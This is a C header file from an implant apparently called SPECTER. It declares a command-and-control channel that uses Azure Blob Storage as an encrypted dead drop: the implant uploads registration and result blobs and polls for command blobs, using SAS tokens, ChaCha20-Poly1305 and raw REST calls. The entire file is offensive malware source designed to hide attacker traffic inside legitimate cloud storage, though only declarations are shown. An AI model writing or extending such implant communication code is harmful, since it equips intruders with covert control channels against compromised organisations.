/**
 * SPECTER Implant — Azure Blob Storage Dead Drop Channel Interface
 *
 * Uses Azure Blob Storage as an encrypted mailbox: both implant and
 * teamserver read/write the same storage account with no direct
 * connection between them.  Per-implant SAS tokens scoped to individual
 * containers.  All blob contents encrypted with ChaCha20-Poly1305
 * before upload.  Raw HTTP REST API — no Azure SDK dependency.
 *
 * Container layout: session-{id}/
 *   metadata       — registration blob (implant → teamserver)
 *   command-{seq}   — task blobs (teamserver → implant)
 *   result-{seq}    — result blobs (implant → teamserver)
 */

#ifndef COMMS_AZURE_H
#define COMMS_AZURE_H

#include "specter.h"
#include "comms.h"
#include "config.h"

/* ------------------------------------------------------------------ */
/*  Constants                                                          */
/* ------------------------------------------------------------------ */

#define AZURE_MAX_ACCOUNT_LEN    64     /* Storage account name length    */
#define AZURE_MAX_CONTAINER_LEN  128    /* Container name length          */
#define AZURE_MAX_BLOB_NAME_LEN  128    /* Blob name length               */
#define AZURE_MAX_SAS_TOKEN_LEN  512    /* SAS token length               */
#define AZURE_MAX_URL_LEN        1024   /* Full blob URL length           */

#define AZURE_SEND_BUF_SIZE      8192   /* HTTP request buffer            */
#define AZURE_RECV_BUF_SIZE      16384  /* HTTP response buffer           */

#define AZURE_BLOB_PREFIX_CMD    "command-"   /* Teamserver → implant    */
#define AZURE_BLOB_PREFIX_RESULT "result-"    /* Implant → teamserver    */
#define AZURE_BLOB_METADATA      "metadata"   /* Registration blob       */

/* Azure Blob REST API versions */
#define AZURE_API_VERSION        "2020-10-02"

/* HTTP methods for REST calls */
#define AZURE_HTTP_PUT           0
#define AZURE_HTTP_GET           1
#define AZURE_HTTP_DELETE        2

/* Poll intervals and limits */
#define AZURE_POLL_INTERVAL_MS   5000   /* Default poll interval          */
#define AZURE_MAX_POLL_RETRIES   3      /* Max retries per poll cycle     */
#define AZURE_MAX_BLOBS_LIST     64     /* Max blobs in list response     */

/* ------------------------------------------------------------------ */
/*  Azure channel configuration (embedded in CHANNEL_CONFIG.url)       */
/* ------------------------------------------------------------------ */

/**
 * Azure dead drop config is packed into the CHANNEL_CONFIG as follows:
 *   url:        storage account name (e.g. "specterstorage")
 *   sni_domain: container name (e.g. "session-abc123")
 *   host_domain: SAS token (url-encoded query string)
 *   port:       443 (always HTTPS)
 *   type:       CHANNEL_AZURE (4)
 */

/* ------------------------------------------------------------------ */
/*  Azure channel state                                                */
/* ------------------------------------------------------------------ */

typedef struct _AZURE_CONTEXT {
    /* Configuration */
    char           account_name[AZURE_MAX_ACCOUNT_LEN];
    char           container[AZURE_MAX_CONTAINER_LEN];
    char           sas_token[AZURE_MAX_SAS_TOKEN_LEN];

    /* State */
    DWORD          send_seq;            /* Next result sequence number     */
    DWORD          recv_seq;            /* Next command sequence expected   */
    BOOL           registered;          /* Metadata blob uploaded          */
    COMMS_STATE    state;               /* Connection state                */

    /* Buffers */
    BYTE           send_buf[AZURE_SEND_BUF_SIZE];
    BYTE           recv_buf[AZURE_RECV_BUF_SIZE];

    /* Encryption key (shared with main comms) */
    BYTE           session_key[32];
    DWORD          msg_seq;             /* AEAD message sequence           */
} AZURE_CONTEXT;

/* ------------------------------------------------------------------ */
/*  URL construction helpers                                           */
/* ------------------------------------------------------------------ */

/**
 * Build a full Azure Blob Storage URL for a specific blob.
 * Format: https://{account}.blob.core.windows.net/{container}/{blob}?{sas}
 * Returns number of bytes written, or 0 on error.
 */
DWORD azure_build_blob_url(AZURE_CONTEXT *ctx, const char *blob_name,
                           char *url_out, DWORD url_out_len);

/**
 * Build the list blobs URL with a prefix filter.
 * Format: https://{account}.blob.core.windows.net/{container}?restype=container&comp=list&prefix={pfx}&{sas}
 */
DWORD azure_build_list_url(AZURE_CONTEXT *ctx, const char *prefix,
                           char *url_out, DWORD url_out_len);

/* ------------------------------------------------------------------ */
/*  Blob I/O operations (raw HTTP REST)                                */
/* ------------------------------------------------------------------ */

/**
 * Upload (PUT) an encrypted blob to Azure storage.
 * Encrypts plaintext with ChaCha20-Poly1305 before upload.
 * Returns STATUS_SUCCESS on HTTP 201 Created.
 */
NTSTATUS azure_put_blob(AZURE_CONTEXT *ctx, COMMS_CONTEXT *comms,
                        const char *blob_name,
                        const BYTE *plaintext, DWORD plaintext_len);

/**
 * Download (GET) and decrypt a blob from Azure storage.
 * data_out: output buffer, data_len: in=buffer size, out=bytes received.
 * Returns STATUS_SUCCESS on HTTP 200 OK with valid decryption.
 */
NTSTATUS azure_get_blob(AZURE_CONTEXT *ctx, COMMS_CONTEXT *comms,
                        const char *blob_name,
                        BYTE *data_out, DWORD *data_len);

/**
 * Delete a blob from Azure storage.
 * Returns STATUS_SUCCESS on HTTP 202 Accepted.
 */
NTSTATUS azure_delete_blob(AZURE_CONTEXT *ctx, COMMS_CONTEXT *comms,
                           const char *blob_name);

/**
 * List blobs in the container with a given prefix.
 * Parses XML response to extract blob names.
 * names_out: array of blob name buffers.
 * count_out: number of blobs found.
 * Returns STATUS_SUCCESS on success.
 */
NTSTATUS azure_list_blobs(AZURE_CONTEXT *ctx, COMMS_CONTEXT *comms,
                          const char *prefix,
                          char names_out[][AZURE_MAX_BLOB_NAME_LEN],
                          DWORD max_names, DWORD *count_out);

/* ------------------------------------------------------------------ */
/*  Channel interface                                                  */
/* ------------------------------------------------------------------ */

/**
 * Initialize the Azure dead drop channel.
 * Parses config from CHANNEL_CONFIG, resolves APIs, uploads metadata
 * blob for registration.
 */
NTSTATUS azure_connect(IMPLANT_CONTEXT *ctx);

/**
 * Send data (task result) via Azure blob upload.
 * Creates result-{seq} blob with encrypted content.
 */
NTSTATUS azure_send(IMPLANT_CONTEXT *ctx, const BYTE *data, DWORD len);

/**
 * Receive data (pending commands) by polling for command-{seq} blobs.
 * Downloads, decrypts, and deletes consumed command blobs.
 * data_out: output buffer, data_len: in=buffer size, out=bytes received.
 */
NTSTATUS azure_recv(IMPLANT_CONTEXT *ctx, BYTE *data_out, DWORD *data_len);

/**
 * Disconnect: clean up state, optionally delete metadata blob.
 */
NTSTATUS azure_disconnect(IMPLANT_CONTEXT *ctx);

/**
 * Health check: attempt to list blobs with a short timeout.
 * Returns STATUS_SUCCESS if the storage account is reachable.
 */
NTSTATUS azure_health_check(IMPLANT_CONTEXT *ctx);

/* ------------------------------------------------------------------ */
/*  Sequence number helpers                                            */
/* ------------------------------------------------------------------ */

/**
 * Format a sequence number into a blob name.
 * e.g. prefix="result-", seq=5 → "result-000005"
 */
void azure_format_seq_blob(const char *prefix, DWORD seq,
                           char *name_out, DWORD name_out_len);

/**
 * Parse a sequence number from a blob name.
 * e.g. "command-000003" → 3
 * Returns 0xFFFFFFFF on parse error.
 */
DWORD azure_parse_seq_from_name(const char *blob_name, const char *prefix);

/* ------------------------------------------------------------------ */
/*  Test support                                                       */
/* ------------------------------------------------------------------ */

#ifdef TEST_BUILD
AZURE_CONTEXT *azure_get_context(void);
void azure_test_reset_context(AZURE_CONTEXT *ctx);
#endif

#endif /* COMMS_AZURE_H */
